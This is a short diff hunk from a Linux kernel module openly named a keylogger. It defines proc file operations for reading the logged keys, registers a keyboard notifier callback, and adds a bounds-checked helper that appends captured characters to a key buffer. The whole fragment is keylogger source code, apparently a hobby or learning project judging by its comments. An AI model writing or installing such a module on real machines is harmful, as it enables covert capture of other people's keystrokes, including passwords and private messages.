@@ -44,6 +44,15 @@ static const struct proc_ops keylogger_proc_ops =
     .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
 };
 
+static void append_char(char c)
+{
+    if (key_index < LOG_BUF_SIZE - 1)
+    {
+        key_buffer[key_index] = c;
+        key_index++;
+    }
+}
+
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct
